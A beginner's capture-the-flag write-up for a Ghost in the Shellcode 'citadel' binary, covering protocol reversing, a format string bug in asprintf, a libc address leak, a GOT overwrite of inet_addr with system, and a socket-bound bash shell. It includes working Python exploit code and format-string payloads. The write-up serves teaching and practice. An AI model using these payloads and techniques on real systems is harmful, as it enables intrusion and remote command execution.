**I'm a noob trying to get better with re and pwn. I wrote this write-up just not to lose the knowledge I got and share it with u, folks \\|_|/**

I didn't manage to play Ghostinshellcode teaser, though still I decided to pwn this task. Let's start!

Firstly I had to install **libc++.so.1** on my Ubuntu 14.04 x64 to run the binary:
```bash
$ sudo apt-get install libc++1
```

Then created a new user **citadel** for challenge to work. I also had issues with dropping privileges (look at sub_40E710) so i just patched the binary to skip this process (there was no need to escalate privilages after successful exploit in the ctf itself, so this patch is harmless). To enable aslr while debugging with gdb + make gdb to follow forks add this to ``~/.gdbinit``:
```bash
set disassembly-flavor intel
set follow-fork-mode child
set disable-randomization off
```

If you debug the binary with gdb, you may experience a state after quitting debugger, when the main process of citadel is still running taking the port and preventing another copy of citadel to execute. The easy way to kill it is:
```bash
fuser -k -n tcp 5060
```

####What the hell is going on over here \\(?_?)/

Firstly we should understand protocol.
'Strings' feature of IDA is very useful in this situation - there is a bunch of c++ code and so it's pretty hard to reverse it. The format of commands is easy to get.
There are several commands:

* REGISTER
* INVITE
* CANCEL
* OPTIONS
* DIRECTORY

Each of these commands has a list of options (diffirent for every one of them). We can use them as following:
```bash
dog@ubuntu:~/ctf/ghostinshelcode2015$ nc localhost 5060
REGISTER x GITSSIP/0.1
Expires: 0
To: bro
From: me
Common Name: noobdoesre
Contact: noobdoesre@gmail.com

GITSSIP/0.1 200 OK
```
After playing with commands we come to a conclusion that DIRECTORY command shows the info we inputted:
```bash
dog@ubuntu:~/ctf/ghostinshelcode2014$ nc localhost 5060
REGISTER x GITSSIP/0.1
To: bro
From: bro
Expires: 0
Common Name: common bro
Contact: bro contact

DIRECTORY * GITSSIP/0.1
Search: *GITSSIP/0.1 200 OK

GITSSIP/0.1 200 OK
0 : [Status: IDLE, To: bro, From: bro, Expires: 0, Contact: bro contact, Name: common bro]
```
Looking at function list we see an outsider: **asprintf**. What a hell this old C man doing among C++ youths?! 

Maybe a format string...

```bash
dog@ubuntu:~/ctf/ghostinshelcode2014$ nc localhost 5060
REGISTER x GITSSIP/0.1
To: %x%x
From: %x.%x
Expires: 0
Common Name: %x.%x
Contact: %x.%x

DIRECTORY * GITSSIP/0.1
Search: *GITSSIP/0.1 200 OK

GITSSIP/0.1 200 OK
0 : [Status: IDLE, To: 00, From: 10a75c0.10a77d0, Expires: 17461792, Contact: 312e3006.2e78250a, Name: 0.0]
```

Yay, we on the rigth path \\(^^)/

If you are not familiar with such type of vulnerabilities, view [this](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf) paper

####How do we exploit it?
Stack is not executable, ASLR is enabled... So we can't just rewrite a stack pointer or something. Maybe rewrite a got.plt entry? 

For that we need an address in got.plt and an address of @system (yes, I'm that captain). The former is easy to get - given binary is static. The question is - which function to pick? Let's think about it later! Let's better find out @system address!

Okay, let's dump stack right before asprintf call and look for yummies inside it:

```bash
(gdb) x/200xg $rsp
0x7fffd292a208:	0x0000000000403166	0x000000000193c7d0
0x7fffd292a218:	0x000000000193c220	0x00000000312e3006
0x7fffd292a228:	0x000078252e78250a	0x0000000000000000
0x7fffd292a238:	0x0000000000000000	0x000000000193c738
0x7fffd292a248:	0x000000000193c720	0x4f54434552002a02
0x7fffd292a258:	0x00007ff062005952	0x000000000193c4e0
0x7fffd292a268:	0x0000000000000030	0x0000000000000000
0x7fffd292a278:	0x000000000193c6e0	0x000000000193c710
0x7fffd292a288:	0x000000000193c710	0x000000000193c202
0x7fffd292a298:	0x000000000193c202	0x000000000193c100
(it is soooo loooooong)
```

Now look where modules reside:

```bash
(gdb) info proc mappings 
...
0x7ff062165000     0x7ff062169000     0x4000        0x0 
0x7ff062169000     0x7ff062324000   0x1bb000        0x0 /lib/x86_64-linux-gnu/libc-2.19.so
0x7ff062324000     0x7ff062524000   0x200000   0x1bb000 /lib/x86_64-linux-gnu/libc-2.19.so
0x7ff062524000     0x7ff062528000     0x4000   0x1bb000 /lib/x86_64-linux-gnu/libc-2.19.so
0x7ff062528000     0x7ff06252a000     0x2000   0x1bf000 /lib/x86_64-linux-gnu/libc-2.19.so
0x7ff06252a000     0x7ff06252f000     0x5000        0x0 
0x7ff06252f000     0x7ff062545000    0x16000        0x0 /lib/x86_64-linux-gnu/libgcc_s.so.1
0x7ff062545000     0x7ff062744000   0x1ff000    0x16000 /lib/x86_64-linux-gnu/libgcc_s.so.1
0x7ff062744000     0x7ff062745000     0x1000    0x15000 /lib/x86_64-linux-gnu/libgcc_s.so.1
...
```
Let's write a small python script to make our job easier:

```python
import sys

#use like: python %file_with_stack_dump 0x_low_edge 0x_high_edge
candidates = []

with open(sys.argv[1]) as addresses:
	allNums = addresses.read()
	allNums = allNums.split()
	low = int(sys.argv[2], 16)
	high = int(sys.argv[3], 16)
	for i in allNums:
		try:
			num = int(i, 16)
			if ( low <= num and high >= num):
				candidates.append(hex(num))
		except:
			continue

print("*" * 50)
for i in candidates:
	print(i[:-1])
```

We leak the only one address, it's **__libc_start_main+245** -> we can calculate the @system address. It's **-0x22fc95** on my system.

Let's choose a function which got.plt entry shall be rewritten:

Digging command handlers I stumbled upon an **inet_addr** call in INVITE handler. Spent five minutes to realize the format of messages:

```bash
(gdb) br inet_addr
Breakpoint 1 at 0x4019e0
(gdb) r
```

```bash
dog@ubuntu:~/ctf/ghostinshelcode2014$ nc localhost 5060
REGISTER x GITSSIP/0.1
To: x
From: x
Expires: 0
Common Name: x
Contact: x

INVITE sip:x@wecancontrolit GITSSIP/0.1
To: x
From: x
Via: x
Contact: x
Allow: x

GITSSIP/0.1 200 OK
GITSSIP/0.1 500 Malformed Header
```

```bash
Breakpoint 1, inet_addr (cp=0x7fff5ea65ce1 "wecancontrolit") at inet_addr.c:93
93	inet_addr.c: No such file or directory.
(gdb) x/s $rdi
0x7fff5ea65ce1:	"wecancontrolit"
```

Yeah, we got error 500, but the tricky thing is: **inet_addr** was called with 'wecancontrolit' string. So, we've chosen our victim (@system takes string through @rdi too).

####Let's write an exploit!
Firstly we need to leak the address of @__libc_start_main+245. Using the stack dump, we can calculate, that using 60th parameter of format string will give us desired address:
```python
import socket

s = socket.socket()
address = '127.0.0.1'
port = 5060
s.connect((address, port))

#leak @__libc_start_main+245 address
s.sendall('''REGISTER x GITSSIP/0.1
To: ''' + '%60$p' + '''
From: x
Expires: 0
Common Name: x
Contact: x

DIRECTORY * GITSSIP/0.1
Search: *
''')

time.sleep(0.2)

systemAddr = s.recv(1024)
systemAddr = int(systemAddr[systemAddr.find('0x') : systemAddr.find('0x') + 14], 16) - 0x22fc95
print('@system at ' + hex(systemAddr))
```
Here we use **Direct Parameter Access** feature of format strings. We command to show the 60th parameter lying on stack as a pointer.

Mmkay, let's rewrite the got.plt entry:
```python
inet_addr = 0x6130A8 #should be static on all systems I suppose
u64 = lambda x: struct.pack("<Q", x)
def writeByte(addr, byte):
	s.sendall('''REGISTER x GITSSIP/0.1
	To: '''.replace('\t', '') + '%%%du%%9$hhn' % (0xe9+ord(byte)) + '''
	From: x
	Expires: 0
	Common Name: xxxxxxx'''.replace('\t', '') + u64(addr) + '''
	Contact: x

	DIRECTORY * GITSSIP/0.1
	Search: *
	'''.replace('\t', ''))
	
for off, byte in enumerate(u64(systemAddr)):
	writeByte(inet_addr + off, byte)

time.sleep(0.2)

s.recv(1024)
```

It's time to explain this magic - we rewrite the address byte by byte using **%u** flag (used to determine value to be written), **Direct Parameter Access** (to make asprintf to use 9th parameter in stack as a pointer for **$hhn**) and **Short Writes** (not to touch the memory around @inet_addr entry). These ugly ``.replace('\t', '')`` are used because indent we use while declaring a proc is included at string itself.

**Q**: How did we understood we need 9th parameter? Why 'Common Name' starts with a bunch of 'x'es?

**A**: It is done experimentally: you place an 'AAAAAAAA' string to 'Common Name' and use a sequence of '%08x.' flags to print the stack. You will hardly have a solid "0x4141414141414141" value, so just play with padding! After several iterations you will understand which parameter to use and how long padding should be.

**Q**: What the heck is that 0xe9 constant? How did we get it?

**A**: Experimentally! Just put a breakpoint at @exit like ``br exit``, launch exploit and compare what was written at ``x/xg 0x6130A8``with the value supposed to be written. Every byte will differ by a constant :)

**Q**: Why do you use SEARCH command after each REGISTER? We can 'stack' REGISTER and then issue only one SEARCH to trigger format string bomb!

**A**: That's right! But I had issues with such approach - connection closed -_- So i decided to go dirty way.

Now we can call @system with almost arbitrary string (there should be no spaces). How this string should look like?

More magic!
```python
trigger vuln
s.sendall('''INVITE sip:x@bash<&4 GITSSIP/0.1
To: x
Via: x
From: x
Contact: x
Allow: x

exec 0>&4 1>&4
cat key
''')

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

**Q**: What do these ``bash<&4``, ``exec 0>&4 1>&4`` do?

**A**: The former is used to 'tie' bash communication channel to 4'th file descriptor. The latter redirects **stdout** (1) and **stdin**(0) to 4-th fd.

**Q**: Why to use telnet? 

**A**: Just4lulz - so we can send arbitrary command to remote shell :)
